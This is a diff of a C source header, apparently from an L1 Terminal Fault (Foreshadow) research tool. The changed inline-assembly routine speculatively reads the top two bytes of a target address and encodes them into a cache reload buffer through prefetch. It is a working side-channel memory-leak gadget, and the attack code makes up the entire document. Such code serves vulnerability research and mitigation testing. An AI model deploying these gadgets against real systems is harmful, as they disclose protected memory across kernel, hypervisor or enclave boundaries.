@@ -59,30 +59,24 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void 
                    : "rax", "r12", "r13", "r14", "rcx", "cc");
 }
 
-static inline __attribute__((always_inline)) void asm_l1tf_leak_nibbles(void *leak_addr,
-                                                                        reload_buffer_t reload_buffer) {
+static inline __attribute__((always_inline)) void
+asm_l1tf_leak_2_highest_bytes(void *leak_addr, two_byte_reload_buffer reload_buffer) {
   __asm__ volatile("xor %%rax, %%rax\n"
-                   "xor %%rbx, %%rbx\n"
                    "movl $0xB1ABE849, %%r12d\n"
                    "movl $0xCD7E16F1, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
                    "movq (%[leak_addr]), %%rax\n"
-                   "movq %%rax, %%rbx\n"
-                   "and $0xf0, %%rax\n"
-                   "and $0x0f, %%rbx\n"
-                   "shl $0x8, %%rax\n"
-                   "shl $0xc, %%rbx\n"
-                   "prefetcht0 (%[nibble0], %%rbx)\n"
-                   "prefetcht0 (%[nibble1], %%rax)\n"
+                   // Only grab the upper two bytes
+                   "shr $0x30, %%rax\n"
+                   // Extend it to a page
+                   "shl $0xc, %%rax\n"
+                   "prefetcht0 (%[reload_buffer], %%rax)\n"
                    "mfence\n"
-                   "inf_loop%=:\n"
-                   "  pause\n"
-                   "  jmp inf_loop%=\n"
                    "handler%=:"
 
                    ::[leak_addr] "r"(leak_addr),
-                   [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
-                   : "rax", "rbx", "r12", "r13", "r14");
+                   [reload_buffer] "r"(reload_buffer[0])
+                   : "rax", "r12", "r13", "r14", "cc");
 }
 
 static inline __attribute__((always_inline)) void asm_l1tf_leak_full(void *leak_addr,
@@ -183,7 +177,7 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_b
 reload_buffer_t *l1tf_reload_buffer_create(void);
 void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer);
 
-void find_ffff_values(scan_opts_t scan_opts);
+void l1tf_find_ffff_values(scan_opts_t scan_opts);
 
 void *l1tf_spawn_leak_page(void);
 
